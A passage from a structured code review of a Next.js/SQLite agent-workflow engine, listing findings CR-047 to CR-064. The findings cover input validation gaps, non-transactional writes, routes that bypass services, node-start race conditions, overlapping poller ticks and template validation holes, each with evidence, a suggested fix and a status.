- **Problem:** `Number(url.searchParams.get("limit") ?? 200)` is passed straight to SQLite. `?limit=abc` gives `NaN`, which better-sqlite3 rejects with `datatype mismatch`, so the request is an unhandled 500 (verified locally). `?limit=-1` means "no limit" in SQLite and returns the whole event log of a long-running flow in one response. The endpoint is polled every 3 s.
- **Evidence:**
  ```ts
  const limit = Number(url.searchParams.get("limit") ?? 200);
  ... `... ORDER BY created_at, id LIMIT ?`, id, after, limit
  ```
- **Suggested fix:** Parse `limit` with `z.coerce.number().int().min(1).max(500).default(200)`. Move the query into a `db.listEvents(flowId, after, limit)` method (see APP-16 (CR-051)).
- **Effort:** S

### CR-048 [Medium] Settings PATCH writes some fields and then rejects later ones

- **Status at `abaa007`:** **Fixed** ([Task 11](review-tasks/11-api-input-validation-settings.md) — `settingsPatchBodySchema` + atomic `SettingsService.update` in `db.transaction`)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-13
- **Related:** CR-003 (APP-03) — fix CR-003 first: validate the whole settings body before writing
- **Location:** `app/api/settings/route.ts:104-178`
- **Problem:** The handler validates and writes field by field. `PATCH {cursor_api_key:"k", default_harness:"cursor", default_execution_mode:"bogus"}` saves the API key and the harness, then returns 400. The client shows "save failed" even though some of the changes were saved. The same happens if `local_agent.timeout_ms` or `secrets` fails after earlier fields were written.
- **Evidence:**
  ```ts
  setCursorApiKey(body.cursor_api_key);            // written
  ...
  if (!["cloud", "local"].includes(body.default_execution_mode)) {
    return NextResponse.json({ error: ... }, { status: 400 });   // after writes
  ```
- **Suggested fix:** Validate the whole body up front with one Zod schema (APP-03 (CR-003)). Then apply every write inside a `SettingsService.update(patch)` that runs in one `db.transaction`.
- **Effort:** S

### CR-049 [Medium] The prompt preview route is a 230-line switch on node key instead of a registry method

- **Status at `abaa007`:** **Fixed** ([Task 28](review-tasks/28-prompt-preview-parity.md))
- **Current severity:** Low (was Medium)
- **Current location:** lib/engine/prompts/prompt-preview.ts; node defs' `previewPrompt` + `rulesKey`

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-14
- **Related:** CR-004 (APP-04) — fix CR-004 first: fix the build-node preview drift first, then generalise
- **Location:** `app/api/flows/[id]/prompt/route.ts:19-178` (switch at 106-160; key literals at 64, 111, 166, 176-177)
- **Problem:** The route rebuilds each node's prompt inputs itself: a raw plan-artifact SQL query, per-node `ctxVars`/`extra`, and the instruction strings. This is the exact string-switch dispatch §3.2 says to replace with the node registry. Adding a node kind means editing this route, and the copied logic already drifts (APP-04 (CR-004)). `nodeRegistry.get(NODE_KEYS.PLAN) as PlanNode` (line 40) is an unchecked downcast.
- **Evidence:**
  ```ts
  switch (nodeKey) {
    case NODE_KEYS.PLAN: { ... }
    case NODE_KEYS.BUILD: { const planRow = db.all(`SELECT a.content FROM artifacts ...`) ... }
    case NODE_KEYS.PIPELINE: { ... }
  ```
- **Suggested fix:** Add an optional `previewPrompt(ctx, {feedback, instructions, branch, contextBlocks})` to the node base class, implemented by each node next to its run path. Put the shared lookup (flow, task, repo, node, effective config) in a `PromptPreviewService`. The route then only parses query params and calls the service.
- **Effort:** L

### CR-050 [Medium] Template save creates draft node templates in the route, with a manual, non-transactional rollback

- **Status:** **Fixed** ([Task 12](review-tasks/12-db-transactions.md) — `TemplateStore.saveWithDrafts` in one `db.transaction`; route thinned)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-15
- **Related:** CR-012 (ENG-07, DATA-29) — fix CR-012 first: use the shared transaction primitive
- **Location:** `app/api/templates/[id]/route.ts:49-125`
- **Problem:** `applyDraftNodeTemplates` creates rows one at a time, mutates the request body (`body.nodes = …`, `delete body.new_node_templates`), and calls `templateStore.update`. On failure it deletes the created rows one by one and ignores rollback errors (`catch { /* keep rolling back */ }`). A crash or rollback failure in the middle leaves orphan node templates. Two concurrent saves of the same template can interleave between create and update. This is business logic that belongs in `TemplateStore`.
- **Evidence:**
  ```ts
  } catch (e: unknown) {
    for (const rowId of createdRows) {
      try { templateStore.deleteNodeTemplate(rowId); } catch { /* keep rolling back */ }
    }
  ```
- **Suggested fix:** Move the logic into `TemplateStore.saveWithDrafts(id, input)`, which wraps draft creation, id remapping and `update` in a single `db.transaction(...)`. The route then validates the body and calls that one method.
- **Effort:** M

### CR-051 [Medium] Routes run raw SQL and domain logic instead of calling service methods

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current location:** app/api/templates/[id]/preview/route.ts:54,80,85,117,133,147, app/api/status/route.ts:12,30-31, app/api/flows/[id]/comments/route.ts, app/api/flows/[id]/events/route.ts:15-18, app/api/artifacts/[id]/route.ts:12, app/api/flows/worktree-status/route.ts:20, app/api/graph/route.ts, app/api/models/route.ts:74, app/api/contracts/route.ts, app/api/templates/[id]/validate/route.ts:54, app/api/tasks/handlers.ts:30, app/api/node-templates/route.ts:20-48, app/api/webhooks/gitlab/route.ts:64-66
- **Re-verification note:** Routes still run raw SQL and domain logic (preview sample context, status snapshot, comment mapping, worktree status, model-catalog normalization, contracts, validate's copy of `taskUniverse`, `tasks/handlers.ts` UPDATE, node-template auto-naming/slugging). Move each block into its owning service (TemplateStore, StatusService, ModelCatalogService, …), delete `app/api/tasks/handlers.ts`, and add tests for the new services.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-16
- **Related:** CR-047 (APP-11); CR-071 (ENG-27); CR-095 (NODE-29); CR-115 (DATA-24); CR-178 (APP-31)
- **Location:**
  - `app/api/templates/[id]/preview/route.ts:31-129,131-155`: `sampleContext` and `sampleTriggerPayload`, with 5 raw SQL queries over `flow_templates`, `flow_template_nodes` and `node_templates`, plus JSON parsing of DB columns.
  - `app/api/status/route.ts:12-32`: raw SQL, plus a pointless `Promise.all` over synchronous `db.get` calls.
  - `app/api/flows/[id]/comments/route.ts:34-55`: row mapping and HostComment parsing.
  - `app/api/flows/[id]/events/route.ts:15-18`.
  - `app/api/artifacts/[id]/route.ts:12-14`.
  - `app/api/flows/worktree-status/route.ts:19-91`: git status composition.
  - `app/api/graph/route.ts:21-49`.
  - `app/api/models/route.ts:31-113`: catalog normalization, with the fast-param filter and the parameter synthesis each written twice (44-46 vs 82-84, 60-63 vs 97-101).
  - `app/api/contracts/route.ts:38-166`.
  - `app/api/templates/[id]/validate/route.ts:54-60`, which the comment admits "mirrors TemplateStore.taskUniverse".
  - `app/api/tasks/handlers.ts:12-33`: raw `UPDATE tasks` in the app layer.
  - `app/api/node-templates/route.ts:22-48`: auto-naming and slug logic.
- **Problem:** This violates the thin-route rule (§3.2). The logic cannot be unit-tested, and the row mappers bypass `lib/db/rows.ts`. Some of it duplicates store logic that is already drifting (validate and taskUniverse; preview's own JSON parse of config columns versus `rows`). `tasks/handlers.ts` is a non-route helper module sitting in `app/api/`.
- **Evidence:**
  ```ts
  // templates/[id]/preview/route.ts:84-86
  const nt = db.get<{ kind: string; config: string | null }>(
    `SELECT kind, config FROM node_templates WHERE id=?`, r.node_template_id
  );
  ```
- **Suggested fix:** Move each block into the service that owns the data:
  - `TemplateStore.sampleContext` and `taskUniverse`, the latter reused by validate.
  - `StatusService.snapshot()`, `CommentService.listForFlow()`, `db.listEvents()`, `ArtifactService.get()`.
  - `WorktreeStatusService`, `ModelCatalogService.normalized()`, `ContractService.describe()`.
  - `TaskService.updateRepoUrl()`, `TemplateStore.createNodeTemplateAutoNamed()`.

  Delete `app/api/tasks/handlers.ts` and call the service from the two routes. Add tests for the new services (DoD).
- **Effort:** L

### CR-052 [Medium] The Settings pages are client components that fetch their data on the client

- **Status at `abaa007`:** **Open**, fix in [Task 41](review-tasks/41-settings-data-and-errors.md)
- **Current location:** app/(workspace)/settings/page.tsx:1,11-50, app/(workspace)/settings/integrations/page.tsx:1, app/(workspace)/settings/repositories/page.tsx:1, app/(workspace)/settings/layout.tsx:1-6, app/(workspace)/settings/loading.tsx
- **Re-verification note:** All three settings pages are still `"use client"` and get their data client-side via `SettingsProvider`; there is no `loaders/settings.ts`, and `GeneralSkeleton` duplicates `settings/loading.tsx`. Add a settings loader, make pages Server Components that prefetch into `HydrationBoundary`, and move the interactive bodies into client islands that reuse the `loading.tsx` skeleton.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-17
- **Related:** CR-036 (UI-02)
- **Location:** `app/(workspace)/settings/page.tsx:1`, `app/(workspace)/settings/integrations/page.tsx:1`, `app/(workspace)/settings/repositories/page.tsx:1` (with `app/(workspace)/settings/layout.tsx:1-6`)
- **Problem:** All three `page.tsx` files are marked `"use client"` and get their data from `SettingsProvider` on the client. Every other workspace page (Tasks, Flows, Templates, Nodes) loads on the server through `loaders/*`. §2.1 says "Server Components by default … fetch initial data on the server". As a result the Settings pages always show a skeleton first. Each page also has an inline skeleton that duplicates `settings/loading.tsx` (`GeneralSkeleton` in `settings/page.tsx:11-50` is identical to `settings/loading.tsx:18-51`).
- **Evidence:**
  ```tsx
  "use client";
  ...
  export default function SettingsGeneralPage() {
    const { settings, loading, error, setError } = useSettings();
  ```
- **Suggested fix:** Add `loaders/settings.ts`. Make each `page.tsx` a Server Component that prefetches into `HydrationBoundary`, the same way as `app/templates/[id]/page.tsx`. Move the interactive body into a client island under `components/settings/`, and reuse the `loading.tsx` skeleton there.
- **Effort:** M

### CR-053 [Medium] Node-template responses are serialized differently in different places, and the create/update responses lack `is_local`

- **Status at `abaa007`:** **Open**, fix in [Task 47](review-tasks/47-thin-routes-and-services.md)
- **Current severity:** Low (was Medium)
- **Current location:** app/api/node-templates/route.ts:58, app/api/node-templates/[id]/route.ts:24,28, loaders/templates.ts:76-88, lib/engine/templates/template-store.ts:63
- **Re-verification note:** Three serializations still exist: POST/PATCH return `{...nt, is_builtin}` without `is_local`, `loadNodeCatalog` builds its own shape, and `serializeNodeTemplate` stays unexported; the loader comment still wrongly says it matches the GET. Current clients only invalidate (never write the mutation result into the cache), so the impact is latent. Export one serializer (or `templateStore.catalogRows()`) and use it in all three places.

- **Severity:** Medium
- **Category:** Code quality
- **Area:** Area 1 — App/API (app/, loaders/)
- **Source:** APP-18
- **Location:** `app/api/node-templates/route.ts:58`, `app/api/node-templates/[id]/route.ts:24,28`, `loaders/templates.ts:81-88`
- **Problem:** `TemplateStore` already has `serializeNodeTemplate`, which includes `is_local` and the locality fields (`lib/engine/templates.ts:44-60`), but it is not exported. The POST and PATCH routes return `{...nt, is_builtin: Boolean(...)}`, which lacks `is_local`. `loadNodeCatalog` builds its own third shape, with `is_local` and `config ?? {}`. So a row created or updated through the API differs from the same row after a page load. A client that writes the mutation result into the cache shows locally-scoped nodes as Library rows until the next refetch. The comment in `loadNodeCatalog` ("the same read the thin /api/node-templates GET wraps") is also wrong: the GET returns `paletteCatalog`.
- **Evidence:**
  ```ts
  return NextResponse.json({ nodeTemplate: { ...nt, is_builtin: Boolean(nt.is_builtin) } });
  ```
- **Suggested fix:** Export `serializeNodeTemplate` or add a `templateStore.catalogRows()` method, and use it in all three places.
- **Effort:** S

### CR-054 [Medium] Node start guards are check-then-act, and `startPlan`/`refinePlan`/`sendChat` have no guard at all

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/flow-engine.ts:1482-1520,1658-1692,1726-1746,1878-1892,1165, lib/engine/nodes/kinds/plan/plan-node.ts:220-241
- **Re-verification note:** `startPlan`/`refinePlan` are gone; plan turns now go through `sendChat`, which still has no status guard, so a double send/second tab launches two concurrent plan turns (each sets `running` itself in `runPlanTurn`). `runNodeManual`, `retryNode` and `resumeNodeFromWebhook` still check status and then defer the real `running` write into `bg()`, leaving a check-then-act window. Add an atomic `claimNode(flowId, key, fromStatuses)` (`UPDATE … WHERE status IN (…)`, check `changes===1`) called synchronously before `bg()` in every trigger path.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-09
- **Status:** Needs verification
  - ENG-09: "The poller, webhooks and the UI all call these, and the double-start window was not measured, so treat that part as needing verification."
- **Related:** CR-015 (NODE-02); CR-055 (ENG-10); CR-060 (ENG-15); CR-070 (ENG-26); CR-071 (ENG-27)
- **Location:** `lib/engine/flow.ts:618-647`, `lib/engine/flow.ts:995-997`, `lib/engine/flow.ts:1278-1311`, `lib/engine/flow.ts:1658-1671`, `lib/engine/flow.ts:1515-1526`, `lib/engine/nodes/base/node-definition.ts:248-252`
- **Problem:** Nodes become `running` only inside `execute()`, after `runNode` has awaited `evalInputMap` and the def's own preparation. The guards that run earlier (`status !== "pending"` in `startNodeStage`/`runNodeManual`, `status !== "waiting"` in `resumeNodeFromWebhook`) do not claim the node. Any await that yields to I/O before `execute` lets a second caller pass the same check. The poller, webhooks and the UI all call these, and the double-start window was not measured, so treat that part as needing verification. `startPlan`, `refinePlan` and `sendChat` definitely check nothing: a double click or a second tab starts two concurrent agent runs on the plan node, both of which pass the late-write guard because the node is `running`.
- **Evidence:**
  ```ts
  startPlan(flowId: string, prompt?: string, ...): void {
    const planKey = this.firstKeyOfType(flowId, "plan");
    if (!planKey) throw new Error("this flow template has no plan node");
    this.setCurrentNode(flowId, planKey);
    this.bg(flowId, planKey, () => this.runNode(flowId, planKey, { ... }).then(() => {}));
  ```
- **Suggested fix:** Add a `claimNode(flowId, key, from: Status[]) : boolean` helper that runs `UPDATE nodes SET status='running' WHERE flow_id=? AND node_key=? AND status IN (...)` and checks `changes===1`. Call it synchronously before `bg()` in every trigger path, and let `execute()` accept an already-running node.
- **Effort:** M

### CR-055 [Medium] `approvePlan` does not check the plan node's status, so approving during a refine silently discards the refine

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/flow-engine.ts:1336-1388, lib/engine/harness/agent-runner.ts:171-182
- **Re-verification note:** `approvePlan` still approves the latest plan artifact and sets the node `approved` regardless of its status, so approving during an in-flight refine starts the build on the old version and the late-write guard then discards the refine. Require `awaiting_approval` (via the claim helper) and throw a typed conflict error otherwise.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-10
- **Related:** CR-014 (NODE-01); CR-046 (APP-10, ENG-28) — fix CR-046 first: throw the typed conflict error; CR-054 (ENG-09) — fix CR-054 first: reuse the claim helper
- **Location:** `lib/engine/flow.ts:1133-1189`, `lib/engine/nodes/base/agent-runner.ts:171-182`
- **Problem:** `approvePlan` approves the latest plan artifact and sets the node to `approved` regardless of the node's current status (`running`, `failed`, `pending`). If a refine is in flight, the build starts on the old plan version. When the refine finishes, the runner's late-write guard sees the node is no longer `running` and drops the result ("result arrived after the node was already approved — ignoring"). The user loses the refine they asked for.
- **Evidence:**
  ```ts
  const plan = db.get<...>(`SELECT a.* FROM artifacts a JOIN nodes n ... a.kind='plan' ORDER BY a.version DESC LIMIT 1`, flowId);
  if (!plan) throw new Error("no plan to approve");
  db.run(`UPDATE artifacts SET status='approved' WHERE id=?`, plan.id);
  this.setNodeStatus(flowId, planKey, "approved");
  ```
- **Suggested fix:** Require `nodeStatus(planKey) === "awaiting_approval"` (or reuse the ENG-09 (CR-054) claim helper), and throw a typed conflict error otherwise.
- **Effort:** S

### CR-056 [Medium] `cancelNode` has no status guard and does not stop cloud runs

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/flow-engine.ts:1698-1718
- **Re-verification note:** `cancelNode` still has no status guard (a `done`/`approved`/`awaiting_approval` node is forced to `failed`), still only calls `cancel` for local mode so cloud agents keep running and billing, and never clears the `waitTimers` entry. Allow cancel only from `running`/`waiting` (pending via an explicit flag for the skip path), call `agentPortRegistry.forMode(flow.execution_mode).cancel(...)` for both modes, and delete the timer.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-11
- **Related:** CR-015 (NODE-02); CR-110 (DATA-19)
- **Location:** `lib/engine/flow.ts:1489-1508`
- **Problem:**
  - Calling `cancel` on a `done`, `approved` or `awaiting_approval` node forces it to `failed`. `skipStepFlow` also calls it on `pending` and `waiting` children.
  - In cloud mode only the DB rows change. The remote agent keeps running and billing; the late-write guard merely discards its result.
  - `cancelNode` also leaves any armed `waitTimers` entry in place.
- **Evidence:**
  ```ts
  if (flow?.execution_mode === "local") {
    for (const r of active) agentPortRegistry.forMode("local").cancel({ runId: r.cursor_run_id });
  }
  db.run(`UPDATE runs SET status='error', ... WHERE node_id=? AND status='running'`, ...);
  this.setNodeStatus(flowId, nodeKey, "failed");
  ```
- **Suggested fix:** Allow cancel only from `running`/`waiting` (and `pending` for the skip path, via an explicit flag). Call `agentPortRegistry.forMode(flow.execution_mode).cancel(...)` for both modes, since the port interface already has `cancel`. Delete the wait-timer entry.
- **Effort:** S

### CR-057 [Medium] A double approve of a code step child starts a second merge loop that flips the merged step to `failed`

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:677-707,727, lib/engine/runtime/fanout/merge-arena.ts:56-58
- **Re-verification note:** `approveChildStep` still only checks `status === "awaiting_approval"`, which stays true during merge-back, so a double approve launches a second `runMergeBack` that later fails fetching the deleted branch and flips the merged step to `failed`. Reject when `mergeArena.isMerging(childFlowId)`, a `step_merges` row is running, or `completed_by === 'merge'`; better, move the child to a distinct merging state atomically.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-12
- **Location:** `lib/engine/step-flows.ts:667-697`, `lib/engine/step-flows.ts:744-779`, `lib/engine/merge-arena.ts:170-173`
- **Problem:** The step node stays `awaiting_approval` for the whole merge-back, so a second approve (double click, or the parent card and the child screen together) passes the check and launches another `runMergeBack`. It queues on the arena lock. After the first merge lands and deletes the step branch, the second passes the loop's ownership check (node still `awaiting_approval`, step not skipped), and its `git fetch origin <branch>` throws. That path becomes `failMergeBack`, which sets the child node to `failed`, so the parent card shows a merged step as failed.
- **Evidence:**
  ```ts
  if (node.status !== "awaiting_approval") throw new Error(`the step is ${node.status}, not awaiting approval`);
  ...
  db.run(`UPDATE plan_steps SET completed_by='merge', ...`, db.now(), childFlowId);
  void this.runMergeBack(parentFlowId, childFlowId, payload, stepRow, node.node_key, branch, integrationBranch);
  ```
- **Suggested fix:** Reject when `mergeArena.isMerging(childFlowId)`, when a `step_merges` row is `running`, or when `stepRow.completed_by==='merge'`. Better, move the child node to a distinct `merging` state atomically at approve time.
- **Effort:** S

### CR-058 [Medium] Step-child code assumes one node per child flow, but explicit child templates can have several

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:685,879,913,923,931, lib/engine/runtime/flow-reconciler.ts:183,193, lib/engine/flow-engine.ts:1643-1647, lib/engine/runtime/split/split-manager.ts:660,673, lib/engine/templates/template-lint.ts:212-235
- **Re-verification note:** Step-child code still uses `SELECT … FROM nodes WHERE flow_id=?` with no `node_key`/`ORDER BY` for approve, merge resume, and reconcile, while lint only forbids SDLC built-ins in `knob.child` templates and never checks the node count. Resolve the child's work node key once (store it in the trigger payload) and query by it, or enforce one-node children in template-lint.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-13
- **Location:** `lib/engine/step-flows.ts:674-675`, `lib/engine/step-flows.ts:868-869`, `lib/engine/step-flows.ts:902-903`, `lib/engine/step-flows.ts:913`, `lib/engine/step-flows.ts:920-921`, `lib/engine/reconcile.ts:183`, `lib/engine/reconcile.ts:193`
- **Problem:** These queries use `SELECT ... FROM nodes WHERE flow_id=?` with no `node_key` and no `ORDER BY`, so SQLite returns an arbitrary node. Other code supports several nodes per child: `stateOf`/`childRollup` roll up all nodes, `get()` uses `childNodes[0]`, and lint only forbids SDLC built-ins and nesting in explicit `knob.child` templates. For a two-node child, approve, merge resume and reconcile can inspect or flip the wrong node (for example approve the not-yet-run node, or resume a merge because node B is `awaiting_approval` while node A failed).
- **Evidence:**
  ```ts
  const node = db.get<{ node_key: string; status: string }>(
    `SELECT node_key, status FROM nodes WHERE flow_id=?`, childFlowId);
  ```
- **Suggested fix:** Resolve the child's work node once, for example `childGraph.nodes[0].key`, or the payload's step node key stored in the trigger payload. Pass it explicitly and query by `node_key`. Alternatively, enforce one-node children in `context-lint` (rule 3 already claims "ONE-NODE chain" but does not check the count).
- **Effort:** M

### CR-059 [Medium] `mergeArena` is a plain module singleton even though it holds process state that reconcile relies on

- **Status at `abaa007`:** **Fixed** ([Task 20](review-tasks/20-merge-arena-and-workspaces.md))
- **Current location:** lib/engine/runtime/fanout/merge-arena.ts (processSingleton export)
- **Re-verification note:** `export const mergeArena = new MergeArena()` is still a plain module singleton holding `locks` and `inFlight`, while the reconciler (itself a `processSingleton`) relies on `isMerging()`; under `next dev` duplicated bundles can double-run merges. Wrap with `processSingleton("mergeArena", () => new MergeArena())`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-14
- **Related:** CR-096 (NODE-30); CR-175 (APP-28); CR-215 (DATA-35)
- **Location:** `lib/engine/merge-arena.ts:46-53`, `lib/engine/merge-arena.ts:298`, `lib/engine/reconcile.ts:154`, `lib/singleton.ts:6-11`
- **Problem:** `lib/singleton.ts` documents that under `next dev` a module-scope `new Foo()` is duplicated across route bundles. `MergeArena` holds the per-branch `locks` and the `inFlight` set, and `Reconciler.reconcileStepMerge` asks `mergeArena.isMerging()` so it does not double-book. When the events-poll bundle's reconciler checks its own empty instance while the action-route bundle is mid-merge, it calls `resumePendingMerge`, giving two merge loops on the same child and directory (and bypassing the lock, which is also per instance).
- **Evidence:**
  ```ts
  class MergeArena {
    private locks = new Map<string, Promise<void>>();
    private inFlight = new Set<string>();
  ...
  export const mergeArena = new MergeArena();
  ```
- **Suggested fix:** `export const mergeArena = processSingleton("mergeArena", () => new MergeArena());`. Also audit the other stateful module-level `new` exports (none others found in this area).
- **Effort:** S

### CR-060 [Medium] Poller ticks can overlap, and non-MR steps of the tick run outside any try/catch

- **Status at `abaa007`:** **Fixed** ([Task 25](review-tasks/25-wait-timers-and-poller.md))
- **Current location:** lib/engine/runtime/flow-poller.ts:40,43-72
- **Re-verification note:** `setInterval(() => void this.tick(), …)` still allows overlapping ticks, and `processWaitTimers()`/`processTemplateSchedules()` still run outside any try/catch, so a throw aborts the tick as an unhandled rejection. Add a `ticking` re-entrancy guard (or self-rescheduling `setTimeout`) and wrap each tick phase in its own logged try/catch.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-15
- **Related:** CR-011 (ENG-06); CR-045 (APP-09); CR-054 (ENG-09)
- **Location:** `lib/engine/poller.ts:40`, `lib/engine/poller.ts:43-72`
- **Problem:** `setInterval(() => void this.tick(), 30s)` does not wait for the previous async tick to finish. With many flows or a slow git host (calls run sequentially per flow and per branch), ticks overlap. Two ticks then read the same `prevStatus`, emit duplicate events, ingest the same comments twice, and both call `triggerPipelineGate`, and the ENG-09 (CR-054) window applies. Separately, `processWaitTimers()` and `processTemplateSchedules()` run before the per-flow try/catch. A throw there (DB error, or a `graphForFlow` failure for a deleted template) aborts the whole tick and becomes an unhandled rejection because of the `void`.
- **Evidence:**
  ```ts
  setInterval(() => void this.tick(), intervalMs).unref?.();
  ...
  private async tick(): Promise<void> {
    flowEngine.processWaitTimers();
    this.processTemplateSchedules();
  ```
- **Suggested fix:** Add a `private ticking = false` re-entrancy guard, or use a self-rescheduling `setTimeout` after `await`. Wrap each phase of `tick()` in its own try/catch that logs the error.
- **Effort:** S

### CR-061 [Medium] Floating promises and mistyped async signatures in the fan-out path and `bg()`

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:145,325,544,574,653,706,896, lib/engine/runtime/split/split-manager.ts:436,650, lib/engine/flow-engine.ts:286,598-615, lib/engine/runtime/flow-reconciler.ts:312-329
- **Re-verification note:** The engine port still declares `finishFanout(...): void` while `FlowEngine.finishFanout` is async, so `step-flow-manager.ts:653` drops its promise; `void this.advance(...)` still voids a non-promise, `checkRollup`/`runMergeBack`/`checkJoin` are fire-and-forget, and the catch blocks in `bg()` and the reconciler re-attach IIFE still write to the DB unguarded. Type the port `Promise<void>` and await it, funnel fire-and-forget work through one guarded helper, and enable `@typescript-eslint/no-floating-promises` (lint now runs).

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-16
- **Related:** CR-010 (ENG-05); CR-039 (NODE-44, TOOL-01) — fix CR-039 first: `no-floating-promises` needs a working lint; CR-066 (ENG-21); CR-111 (DATA-20)
- **Location:** `lib/engine/step-flows.ts:142`, `lib/engine/step-flows.ts:643-648`, `lib/engine/step-flows.ts:318`, `lib/engine/step-flows.ts:534`, `lib/engine/step-flows.ts:564`, `lib/engine/step-flows.ts:696`, `lib/engine/flow.ts:505-521`, `lib/engine/reconcile.ts:312-329`
- **Problem:**
  - The engine port declares `finishFanout(...): void`, but `FlowEngine.finishFanout` is `async`. `onAllResolved` therefore never awaits it, and errors from `advanceFrom`/`edgeActive` escape unhandled.
  - `void this.advance(...)` voids a non-promise, which is misleading.
  - `checkRollup` and `runMergeBack` are fired with `void`.
  - In `bg()` and the reconcile IIFE, the `catch` block itself writes to the DB. After a flow is deleted mid-run, the FK-enforced `emitEvent` throws inside the catch, and the IIFE promise rejects with nobody listening.
- **Evidence:**
  ```ts
  finishFanout(parentFlowId: string, nodeKey: string, output: Record<string, unknown>): void;
  ...
  this.e.finishFanout(parentFlowId, nodeKey, { steps: aggregate.steps, ... });
  ```
- **Suggested fix:**
  1. Type the port method `Promise<void>` and `await` it.
  2. Funnel fire-and-forget work through one `bg()`-style helper whose catch is itself guarded (try/catch around the error reporting, falling back to `console.error`).
  3. Enable `@typescript-eslint/no-floating-promises`.
- **Effort:** S

### CR-062 [Medium] Template validation has no cycle detection on `next` edges

- **Status at `abaa007`:** **Fixed** ([Task 23](review-tasks/23-graph-semantics-and-validation.md))
- **Current location:** lib/engine/templates/template-store.ts:799-811, lib/engine/templates/template-lint.ts:352-358
- **Re-verification note:** `validated()` still rejects only unknown endpoints, self-edges and duplicates; a `next`-edge cycle (A→B→A) saves fine and then idles silently (join `all`) or becomes an unconditional re-entry (join `any`). Add a DFS/Kahn check over `kind==="next"` edges that rejects with "use a loop edge for re-entry", plus a template-store test.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-17
- **Location:** `lib/engine/templates.ts:857-869`, `lib/engine/context-lint.ts:145-354`, `lib/engine/flow.ts:960-966`
- **Problem:** `validated()` rejects self-edges, duplicates and unknown endpoints, and lint checks references and JSONata, but nothing rejects a `next`-edge cycle (for example A→B→A drawn as `next` rather than `loop`). With join `all`, A's incoming edge from B is never resolved before A runs, so `start()` skips A and the flow sits idle with no error. With `any`, the cycle silently becomes an unconditional re-entry that the engine otherwise forbids ("no silent branches").
- **Evidence:**
  ```ts
  if (!keys.has(e.from)) throw new Error(`edge from unknown node "${e.from}"`);
  if (!keys.has(e.to)) throw new Error(`edge to unknown node "${e.to}"`);
  if (e.from === e.to) throw new Error(`self-edge on "${e.from}"`);
  ```
- **Suggested fix:** Run a DFS or Kahn topological check over `kind==="next"` edges in `validated()` (or as a lint problem with `edgeIndex`), and reject cycles with "use a loop edge for re-entry". Add a template-store test.
- **Effort:** S

### CR-063 [Medium] Validator accepts edge shapes the runtime silently ignores (labels on non-decision edges, conditions on decision edges)

- **Status at `abaa007`:** **Fixed** ([Task 23](review-tasks/23-graph-semantics-and-validation.md))
- **Current location:** lib/engine/flow-engine.ts:1041-1057, lib/engine/templates/template-store.ts:812-829, lib/engine/templates/template-lint.ts:352-358
- **Re-verification note:** `edgeActive` still returns false for any labeled edge out of a non-decision node and ignores `condition` on decision edges, yet `validated()` only checks decision out-edges and lint still compiles decision-edge conditions. Reject labels on non-decision-source edges and conditions on decision out-edges in `validated()`, mirrored as lint problems with `edgeIndex`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-18
- **Related:** CR-164 (TOOL-11)
- **Location:** `lib/engine/flow.ts:872-883`, `lib/engine/templates.ts:870-886`, `lib/engine/context-lint.ts:345-351`
- **Problem:**
  - `edgeActive` returns `false` for any labeled edge out of a non-decision node, and ignores `condition` entirely on decision edges.
  - `validated()` only checks decision out-edges. A label on an ordinary edge (possible through YAML import or the editor) saves fine, and at runtime its target is skipped forever.
  - Lint compiles decision-edge conditions, which suggests they are honoured when they are not.
- **Evidence:**
  ```ts
  if (src.decision) {
    return e.label != null && (src.chosen ?? []).includes(e.label);
  }
  if (e.label != null) return false; // labels are only meaningful out of a decision
  ```
- **Suggested fix:** In `validated()`, reject `label` on edges whose source is not a decision, and reject `condition` on decision out-edges (or start honouring it). Mirror these checks as lint problems with `edgeIndex`.
- **Effort:** S

### CR-064 [Medium] Auto-wrap template lookup can never match, so every fan-out expansion creates a new hidden template and inbound hook

- **Status at `abaa007`:** **Fixed** ([Task 19](review-tasks/19-fanout-rollup-and-promises.md))
- **Current location:** lib/engine/runtime/fanout/step-flow-manager.ts:436-466, lib/engine/templates/template-store.ts:233-236,897, lib/engine/runtime/hook-store.ts:71-88
